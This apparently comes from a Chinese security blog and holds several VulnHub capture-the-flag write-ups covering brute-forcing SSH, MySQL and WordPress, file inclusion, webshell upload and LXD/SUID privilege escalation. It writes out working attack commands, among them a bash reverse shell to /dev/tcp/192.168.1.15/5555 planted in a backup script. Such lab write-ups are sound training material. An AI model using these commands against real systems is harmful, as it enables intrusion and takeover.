server</span><br><span class="line">but it&#x27;s still under development</span><br><span class="line"></span><br><span class="line">* web_api.php</span><br><span class="line"></span><br><span class="line">* records_api.php</span><br><span class="line"></span><br><span class="line">* files_api.php</span><br><span class="line"></span><br><span class="line">* database_api.php</span><br></pre></td></tr></table></figure><p>目测是文件包含，传个file：<code>http://192.168.1.20:8011/api/files_api.php?file=../../etc/passwd</code><br>然后：<code>HACKER DETECTED</code>，我以为是过滤，换成<code>http://192.168.1.20:8011/api/files_api.php?file=index.html</code>还是 一样，所以改成POST传参。<br><img src="https://img.xpctf.cn/img/20200814165404.png"></p><p>下载index备份到本地，命令：<code>wget http://192.168.1.20/index.html.bak</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This is the default web page for this server.&lt;/p&gt;</span><br><span class="line">&lt;p&gt;The web server software is running but no content has been added, yet.&lt;/p&gt;</span><br><span class="line">&lt;a href=&quot;/development&quot;&gt;development&lt;/a&gt;</span><br><span class="line">&lt;!-- I will use frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 as the .htpasswd file to protect the development path --&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>发现了development的用户密码，保存后用joh破解；得到frank:frank!!!<br><img src="https://img.xpctf.cn/img/20200814164132.png"></p><p>这个时候先不着急访问development，使用ssh登录frank账号。<br>返回：<code>Permission denied, please try again.</code>拒绝权限</p><p>使用账号访问development目录，提示我们<code>the uploader tool (finished but need security review)</code>,访问<code>http://192.168.1.20/development/uploader/</code>成功进入上传界面。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>目前确定：存在文件上传，文件包含<br>利用访问：上传图片shell，使用包含反弹shell<br><img src="https://img.xpctf.cn/img/20200814165824.png"><br>本地监听设置的端口，去网站上传shell文件<br>返回：<code>File is an image - image/gif.The file shell.gif has been uploaded to my uploads path. </code><br>在这里卡了很久，找不到上传目录，后来使用伪协议包含了upload.php<br>命令：<code>curl -X POST -d &quot;file=php://filter/convert.base64-encode/resource=/var/www/development/uploader/upload.php&quot; http://192.168.1.20:8011/api/files_api.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target_dir</span> = <span class="string">&quot;FRANKuploads/&quot;</span>;</span><br><span class="line"><span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$imageFileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$target_file</span>,PATHINFO_EXTENSION));</span><br><span class="line"><span class="comment">// Check if image file is a actual image or fake image</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$check</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$check</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . <span class="variable">$check</span>[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">        <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check if file already exists</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, file already exists.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check file size</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file is too large.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Allow certain file formats</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$imageFileType</span> != <span class="string">&quot;jpg&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;png&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;jpeg&quot;</span></span><br><span class="line">&amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;gif&quot;</span> ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Check if $uploadOk is set to 0 by an error</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$uploadOk</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line"><span class="comment">// if everything is ok, try to upload file</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span>. <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]). <span class="string">&quot; has been uploaded to my uploads path.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到是<code>FRANKuploads</code>，返回200，这里目录有个坑：<br>注意看他提示，上传成功提示保存到我的目录，FRANK是用户名；脑洞不够大<br><img src="https://img.xpctf.cn/img/20200814170717.png"><br>因为我们的不是php后缀文件，不能直接执行；需要使用api文件包含<br><img src="https://img.xpctf.cn/img/20200814171520.png"><br>拿到webshell后成功拿到用户flag：4795aa2a9be22fac10e1c25794e75c1b<br><img src="https://img.xpctf.cn/img/20200814171724.png"></p><h2 id="权限提示"><a href="#权限提示" class="headerlink" title="权限提示"></a>权限提示</h2><p>切换到frank，但密码好像和网站密码不一致，su没成功<br><img src="https://img.xpctf.cn/img/20200814172050.png"><br>查看一下内核版本，考虑使用内核提权，内核：2.6.35-19-generic<br>Google搜索：2.6.35-19-generic exploit-db<br>找到github上的一个漏洞库，2.6.35-19-generic可以利用。<br>Github：<a href="https://github.com/lucyoa/kernel-exploits">https://github.com/lucyoa/kernel-exploits</a><br>复制到kali，使用python搭建简单服务器，到靶机上下载提权文件<br><img src="https://img.xpctf.cn/img/20200814173014.png"><br>系统flag：8f420533b79076cc99e9f95a1a4e5568</p><h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>我们国人还是不能很好的理解英语，上传目录是最大的体现<br>做题还是少了，要之前有类似的经验，找目录就不会浪费太多时间<br>那么好的漏洞库你不git?</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>So Simple: 1 Writeup</title>
      <link href="/posts/e470/"/>
      <url>/posts/e470/</url>
      
        <content type="html"><![CDATA[<blockquote><p>This is an easy level VM with some rabbitholes. Enumeration is key to find your way in. There are three flags (2 user and 1 root flag).<br>The VM is tested on Virtualbox. After the startup it shows the IP address.<br>Share your rootflag with me on Twitter: @roelvb79<br>Good luck and have fun!<br>This works better with VirtualBox rather than VMware</p></blockquote><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>登录界面已经输出了IP地址，直接nmap扫描起<br>就开放了22端口了80端口<br><img src="https://img.xpctf.cn/img/20200813211954.png"></p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>描述：<code>这是带有一些兔子洞的简单级别的VM。枚举是您找到路的关键</code>,<br>我们使用hxdra爆破ssh，命令：<code>hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 192.168.1.18 ssh</code><br><img src="https://img.xpctf.cn/img/20200813211850.png"><br>ssh不支持密码验证，考虑扫描目录，可能存在密钥文件。</p><p>打开Web查看什么都没有，很干净，执行目录扫描！<br><img src="https://img.xpctf.cn/img/20200813212346.png"><br>发现一个wordpress目录，打开确实是wordpress程序</p><p>继续扫描Web，使用wpscan扫描wordpress，命令：<code>wpscan --url http://192.168.1.18/wordpress/ -e u,p</code><br>发现admin，max账号，对这两个账号继续进行枚举攻击，命令：<code>wpscan --url http://192.168.1.18/wordpress/ -U username -P /usr/share/wordlists/dicr.txt -t 100</code>，尝试使用不同的字典爆破。<br><img src="https://img.xpctf.cn/img/20200813213227.png"><br>[SUCCESS] - max &#x2F; opensesame<br>爆破出了max账号的密码，admin等他继续爆破，先登录max看看；爆破了一晚上也没有结果，看来是无望了。<br>看到wpscan识别出了两款插件，Google搜索插件版本的exploit；<br><img src="https://img.xpctf.cn/img/20200814083826.png"><br>看到了搜索结果：WordPress Plugin Social Warfare &lt; 3.5.3 - Exploit Database，说明可以符合利用条件。<br><img src="https://img.xpctf.cn/img/20200814083908.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>根据描述发现目标版本符合漏洞利用条件，把exp复制到kali保存，运行脚本<br><img src="https://img.xpctf.cn/img/20200814084344.png"><br>需要提供一个有payload的url给他，代码执行漏洞那我写一个php代码；使用python临时搭建http服务。<br><img src="https://img.xpctf.cn/img/20200814085644.png"><br>这玩意也不行啊，好像paylaod得直接返回shell，不是什么payload都能执行，我们看一下脚本。<br><img src="https://img.xpctf.cn/img/20200814090021.png"><br>输出脚本url手动测试，但是输出得时候发现wordpress没了，只有IP。<br>后来通过搜索得到了一篇详细得利用说明，最后获得webshell。<br><img src="https://img.xpctf.cn/img/20200814091713.png"><br>通过中国蚁剑连接到服务器，然后执行伪终端进一步提权！<br>参考链接：<a href="https://blog.csdn.net/weixin_30672019/article/details/99381863">https://blog.csdn.net/weixin_30672019/article/details/99381863</a></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>使用<code>cat /etc/passwd|grep /bin/bash</code>查看可以登录的用户；<code>cd /home</code>查看用户flag，结果没有max用户权限，试试steven用户。<br><img src="https://img.xpctf.cn/img/20200814092126.png"><br>steven用户也没有权限，我之前爆破出max的密码，使用<code>su max</code>尝试登陆，结果：<code>Password: su: Authentication failure</code><br>看来还得提权到max，<code>ls -la</code>查看隐藏文件；有.ssh文件，还记得上面说的寻找ssh密钥吗？<br><img src="https://img.xpctf.cn/img/20200814092841.png"><br>把id_rsa复制到kali，然后使用ssh密钥登录max的ssh。<br><img src="https://img.xpctf.cn/img/20200814093050.png"><br>成功提权到max并获得第一个flag：073dafccfe902526cee753455ff1dbb0<br><img src="https://img.xpctf.cn/img/20200814093301.png"><br>有lxd权限，可以使用lxd提权；刚好上次靶机的lxd提权脚本还在。<br><img src="https://img.xpctf.cn/img/20200814094302.png"><br>exploit：<a href="https://www.exploit-db.com/exploits/46978">https://www.exploit-db.com/exploits/46978</a></p><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>home&#x2F;max&#x2F;user.txt：073dafccfe902526cee753455ff1dbb0<br>home&#x2F;steven&#x2F;user2.txt：b662b31b7d8cb9f5cdc9c2010337f9b8<br>root&#x2F;flag.txt：Easy box right? Hope you’ve had fun! Show me the flag on Twitter @roelvb79</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> So Simple </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sunset: midnight Writeup</title>
      <link href="/posts/1bc0/"/>
      <url>/posts/1bc0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Difficulty: Intermediate<br>Important!: Before auditing this machine make sure you add the host “sunset-midnight” to your &#x2F;etc&#x2F;hosts file, otherwise it may not work as expected.<br>It is recommended to run this machine in Virtualbox.<br>This works better with ViritualBox rather than VMware </p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>导入到VirtualBox到中，切换仅主机模式，Vmware的kaili主机桥接到virtualbox网卡。</p><p>使用arp-acan -l发现主机，排除1和29，剩下一个10就是靶机IP了，也可以通过MAC地址确定。<br><img src="https://img.xpctf.cn/img/20200813105238.png"><br>并把<code>192.168.1.10sunset-midnight</code>写到<code>/etc/hosts</code>中</p><h2 id="靶机扫描"><a href="#靶机扫描" class="headerlink" title="靶机扫描"></a>靶机扫描</h2><p>命令：nmap -A -T4 -p- -v 192.168.1.11<br>靶机开放端口：22，80，3306<br>IP绑定域名：sunset-midnight<br>Web程序：WordPress 5.4.2<br>HTTP服务器：: Apache&#x2F;2.4.38 (Debian)<br><img src="https://img.xpctf.cn/img/20200813110636.png"></p><h2 id="端口爆破"><a href="#端口爆破" class="headerlink" title="端口爆破"></a>端口爆破</h2><p>昨晚在TG上一个大佬跟我说：<code>其他端口服务测试要优先于web端口的测试,因为web测试流程更长,兔子洞存在的可能性更高,其他端口测试相对单一直接..</code></p><p>所以咱们直接试试3306弱口令，尝试hydra爆破。<br><img src="https://img.xpctf.cn/img/20200813112527.png"><br>爆破成功，大佬说得对，花5分钟尝试其他端口，不会吃亏！</p><p>登录后直接查看管理员数据库，破解密文或者用一个也知名文的密文替换。<br><img src="https://img.xpctf.cn/img/20200813113036.png"><br>使用hash-identifier识别密钥类型，提示可能是”Wordpress”的md5。<br><img src="https://img.xpctf.cn/img/20200813114450.png"></p><p>同时尝试wpscan爆破admin用户密码：<code>wpscan --url http://sunset-midnight/ -U username -P /usr/share/wordlists/rockyou.txt -t 100</code><br>爆破登录密码失败告终！！！</p><p>把admin加密成md5更新密码：21232f297a57a5a743894a0e4a801fc3<br><img src="https://img.xpctf.cn/img/20200813143939.png"></p><p>更新完后退出数据库，尝试admin-admin登录后台<br><img src="https://img.xpctf.cn/img/20200813143808.png"><br><strong>登录成功！！！</strong></p><h2 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h2><p>修改404.php把shell放上去，访问404页面成功反弹shell回kali<br><img src="https://img.xpctf.cn/img/20200813150402.png"><br>地址：<code>http://sunset-midnight/wp-content/themes/twentytwenty/404.php</code><br>反弹回来的shell权限很低，user flag都看不了，对靶机继续提权。<br><img src="https://img.xpctf.cn/img/20200813150221.png"></p><p>使用python优化终端，或者返回好看的终端：<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>后来在wordpress配置文件找到了jose数据库用户账号密码，尝试<code>su jose</code><br><img src="https://img.xpctf.cn/img/20200813152728.png"><br>由于这个反弹终端不太好用，尝试使用ssh登录jose，登录jose后可以获得user.txt<br><img src="https://img.xpctf.cn/img/20200813152829.png"><br>user flag：956a9564aa5632edca7b745c696f6575</p><h2 id="Root提权"><a href="#Root提权" class="headerlink" title="Root提权"></a>Root提权</h2><p>执行命令：<code>find / -perm -4000 -type f 2&gt;/dev/null</code><br>该命令能查找出有SUID权限的命令，f是普通文件，2&gt;后是屏蔽错误<br>参考文章：<br><a href="https://blog.csdn.net/boqiangqing9840/article/details/100967938">https://blog.csdn.net/boqiangqing9840/article/details/100967938</a><br><a href="https://www.cnblogs.com/iaknehc/p/6881517.html">https://www.cnblogs.com/iaknehc/p/6881517.html</a></p><p>执行<code>/usr/bin/status</code>时提示<code>sh: 1: service: not found</code><br><img src="https://img.xpctf.cn/img/20200813161326.png"></p><p>所以使用service即可提权，使用ssh-keygen建立长久连接吧<br><img src="https://img.xpctf.cn/img/20200813161736.png"></p><p>最后还是到了激动人心的时刻，查看flag<br><img src="https://img.xpctf.cn/img/20200813161839.png"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> sunset </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Funboc:1 Writeup</title>
      <link href="/posts/3bac/"/>
      <url>/posts/3bac/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Boot2Root ! This is a reallife szenario, but easy going. You have to enumerate and understand the szenario to get the root-flag in round about 20min.<br>This VM is created&#x2F;tested with Virtualbox. Maybe it works with vmware.<br>If you need hints, call me on twitter: @0815R2d2<br>Have fun…<br>This works better with VirtualBox rather than VMware</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>导入到VirtualBox到中，切换仅主机模式，Vmware的kaili主机桥接到virtualbox网卡。<br>使用arp-acan -l发现主机，排除1和29，剩下一个11就是靶机IP了，也可以通过MAC地址确定。<br><img src="https://img.xpctf.cn/img/20200812151446.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>命令：nmap -A -T4 -p- -v 192.168.1.11<br>靶机开放端口：21，22，80，33060<br>IP绑定域名：funbox.fritz.box<br>Web程序：WordPress 5.4.2<br>HTTP服务器：: Apache&#x2F;2.4.41 (Ubuntu)</p><p>把<code>funbox.fritz.box</code>加入到本地本地hosts后使用浏览器打开web服务，看到了WordPress熟悉的界面，看到了纯英文提示，只能百度翻译了。提示暴力破解，root有两个，mysql和ssh。<br><img src="https://img.xpctf.cn/img/20200812153044.png"></p><h2 id="漏洞查找"><a href="#漏洞查找" class="headerlink" title="漏洞查找"></a>漏洞查找</h2><p>尝试ssh爆破：hydra -l root -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 192.168.1.11 ssh</p><p>尝试mysql爆破：hydra -s 33060 -l root -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 192.168.1.11 mysql</p><p><img src="https://img.xpctf.cn/img/20200812164928.png"><br>MySQL爆破提示版本不符合，我也不知道为什么，知道的评论告诉我。</p><p>暂时放弃爆破，转为80端口尝试(惯用套路)，使用wpscan扫描wordpress。</p><p>命令：wpscan –url <a href="http://funbox.fritz.box/">http://funbox.fritz.box/</a> -e u,p<br>找到admin,joe用户，手动写一个用户字典进行密码爆破<br><img src="https://img.xpctf.cn/img/20200812170734.png"></p><p>命令：wpscan –url <a href="http://funbox.fritz.box/">http://funbox.fritz.box/</a> -U username.txt -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -t 100<br>成功爆破admin和joe密码，直接使用admin登录后写404shell。<br><img src="https://img.xpctf.cn/img/20200812171828.png"></p><p><strong>补充：wpscan需要更新，但更新失败；先安装依赖，然后wpscan –update</strong><br><code>apt-get install gcc git ruby ruby-dev libcurl4-openssl-dev make zlib1g-dev</code></p><h2 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h2><p>我们保存编辑的时候发现：无法与站点通信以检查致命错误，因此PHP更改已恢复。您需要通过其他方式上传PHP文件更改，例如使用SFTP。<br><img src="https://img.xpctf.cn/img/20200812195956.png"></p><p>看来是禁止编辑了，试试其他方法，webshell失败告终！</p><h2 id="FTP和SSH"><a href="#FTP和SSH" class="headerlink" title="FTP和SSH"></a>FTP和SSH</h2><p>开放了21和22端口，继续尝试登录FTP和SSH，使用admin和joe登录。<br>admin登录失败，joe成功登录SSH，目录有个mbox文件，是邮件。<br>后来使用cd ..切换失败：-rbash:cd:受限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">嗨，乔，请告诉搞笑，备份脚本完成了。</span><br><span class="line">乔，WTF！？！？！？！？！？！立即更改密码！12345建议解雇你。</span><br></pre></td></tr></table></figure><p><img src="https://img.xpctf.cn/img/20200812201314.png"></p><p>继续使用joe登录FTP，使用FTP登录成功切换到funny用户目录，下载网站备份。<br><img src="https://img.xpctf.cn/img/20200812201908.png"></p><p>但我看了一下我就傻眼了，wordpress的登录账号都拿到了，看备份源码有什么用？</p><p>然后直接使用FTP把shell脚本上传到网站根目录，但访问显示：WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) </p><h2 id="备份脚本"><a href="#备份脚本" class="headerlink" title="备份脚本"></a>备份脚本</h2><p>邮件中说备份脚本完成了，应该有个备份脚本在某处，原来是隐藏文件。<br><img src="https://img.xpctf.cn/img/20200812202512.png"></p><p>备份脚本应该是会自动执行，我们get下载写上反弹bash后put回去；本地监听5555端口，等待shell反弹。<br><code>bash -i &gt;&amp; /dev/tcp/192.168.1.15/5555 0&gt;&amp;1</code></p><p>成功反弹funny的shell到kali，执行：<code>find / -name user.txt 2&gt;/dev/null</code>；没有任何返回，应该没有用户flag。<br><img src="https://img.xpctf.cn/img/20200812204340.png"></p><h2 id="SSH连接"><a href="#SSH连接" class="headerlink" title="SSH连接"></a>SSH连接</h2><p>使用ssh密钥的方式登录funny，用ssh-keygen生成密钥：<code>ssh-keygen -t rsa</code><br>id_rsa：私钥<br>id_rsa.pub：公钥<br>进入.ssh目录把公钥复制回kali的.ssh目录并保存为id_rsa；并在靶机执行：<code>mv id_rsa.pub authorized_keys</code><br>最后在密钥文件目录下执行：<code>ssh funny@192.168.1.11 -i ~/.ssh/id_rsa</code><br><img src="https://img.xpctf.cn/img/20200812212332.png"><br><strong>成功实现免密登录SSH</strong><br>ssh-keygen参考文章：<a href="https://www.cnblogs.com/shoufeng/p/11022258.html">https://www.cnblogs.com/shoufeng/p/11022258.html</a></p><h2 id="lxd和lxc提权"><a href="#lxd和lxc提权" class="headerlink" title="lxd和lxc提权"></a>lxd和lxc提权</h2><p>通过git将构建好的alpine镜像克隆至本地；<br><code>git clone https://github.com/saghul/lxd-alpine-builder.git</code><br>执行“build -alpine”命令完成最新版本的Alpine镜像构建，此操作必须由root用户完成；<br><code>./build-alpine</code>#过程比较慢<br>执行完上述操作将在本地文件生成一个tar文件，将tar文件放至靶机的&#x2F;tmp目录中<br><code>python -m SimpleHTTPServer</code>或<code>python3 -m http.server 8000</code><br><img src="https://img.xpctf.cn/img/20200813083631.png"><br>在靶机使用<code>wget http://192.168.1.15:8000/alpine-v3.12-x86_64-20200813_0835.tar.gz</code>下载到本地<br>镜像构建完成之后，我们就可以将其以镜像的形式添加进LXD了：<br><code>lxc image import ./alpine-v3.12-x86_64-20200813_0835.tar.gz --alias myimage</code><br>使用<code>lxc image list</code>可以查看所有镜像列表。<br>执行<code>lxc init myimage ignite -c security.privileged=true</code>报错如下是因为lxd没有初始化<br><img src="https://img.xpctf.cn/img/20200813092512.png"><br>执行lcd init进行初始化，存储名称改成dir，其他全部默认即可<br><img src="https://img.xpctf.cn/img/20200813092606.png"><br>初始化完成后依次执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lxc init myimage ignite -c security.privileged=true</span><br><span class="line">lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line">lxc start ignite</span><br><span class="line">lxc exec ignite /bin/sh</span><br></pre></td></tr></table></figure><p>主机根目录挂载到容器&#x2F;mnt目录，切换到root目录查看flag.txt<br><img src="https://img.xpctf.cn/img/20200813093002.png"></p><p><strong>lxd提权参考：</strong><a href="https://www.freebuf.com/articles/network/216803.html">https://www.freebuf.com/articles/network/216803.html</a></p><h2 id="exploit-db提权"><a href="#exploit-db提权" class="headerlink" title="exploit-db提权"></a>exploit-db提权</h2><p>使用exploit-db的提权脚本更快捷，也很方便；不要记住太多命令，直接把tar包下载打本地执行<br><code>./exploit -f alpine-v3.12-x86_64-20200813_0835.tar.gz</code><br><img src="https://img.xpctf.cn/img/20200813100947.png"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Funboc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全不需要视力</title>
      <link href="/posts/9a39/"/>
      <url>/posts/9a39/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Difficulty: Intermediate<br>Important!: Before auditing this machine make sure you add the host “sunset-midnight” to your &#x2F;etc&#x2F;hosts file, otherwise it may not work as expected.<br>It is recommended to run this machine in Virtualbox.<br>This works better with ViritualBox rather than VMware</p></blockquote><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p><img src="https://img.xpctf.cn/img/20200811192738.jpg"><br>现在进行后导入到VMware中，因为网站提示<code>DHCP service: Enabled</code>，所以切换到仅主机模式，kali也设置仅主机模式。<br>使用nmap发现主机时未发现靶机，重启里和靶机和kali还是没有找到IP，后来看了描述说<code>建议在Virtualbox中运行此计算机。</code>，那我下个Virtualbox呗。<br>下载好导入后改成桥接kali还是扫描还是没发现靶机，后来了解到VMware中的虚拟机不能和Virtualbox中的虚拟机通信。<br>之后又把kali从VMware导出ovf，又导入到Virtualbox中，kali和靶机都切换成仅主机，终于可以ping通了。</p><p><img src="https://img.xpctf.cn/img/20200811192959.png"><br>VMware用习惯了，Virtualbox真用不来，本着不信邪的心态找俩个虚拟机通信的解决方案，最后在一个大佬告诉我了解决方案。<br><img src="https://img.xpctf.cn/img/20200811193236.png"><br>根据这种逻辑，Virtualbox桥接VMware的仅主机网卡也是可以的，但我没有测试。<br>最后还是不太愉快的完成了环境的搭建，还解决了VMware和Virtualbox之间通信的问题。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>根据描述修改本地hosts，很明显WordPress博客，直接浏览器打开康康。<br>当我打开<code>http://sunset-midnight/</code>是又重定向到<code>http://funbox.fritz.box/</code>了，那我就把它也加到hosts里。<br>打开后向下翻，找到了这么一段提示。其中下面这两条是提示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">There are a minimum of 2 fast ways to get initial footstep. Root needs a bit more time.</span><br><span class="line">至少有两种快速获取初始足迹的方法。根需要多一点时间。</span><br><span class="line">I am root and I testet my password with a lot of wordlists. Hydra is in this case not your friend.</span><br><span class="line">我是root用户，我用很多单词表测试我的密码。在这种情况下，九头蛇不是你的朋友。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>继续收集信息，使用<code>nmap -p- -T4 -A -v funbox.fritz.box</code>来扫描靶机，根据返回信息确定端口21，22，80，33060开放，并且WordPress 5.4.2，Apache&#x2F;2.4.41 (Ubuntu)，我们针对80和33060&#x3D;&gt;mysql端口来展开渗透。</p><p><img src="https://img.xpctf.cn/img/20200811220158.png"></p><p>Google搜索wordpress 5.4.2 inurl:exploit-db.com没有发现可以之间利用的漏洞，根据他的提示走，使用九头蛇爆破。看到mysql是开放状态，这就意味着允许远程连接，再看<code>I am root</code>,说明用户名是root，所以推测是mysql爆破。</p><p>使用“xhydra”使用gui打开，虽然gui更容易上手，但还是用命令行吧，提高最多。<br><img 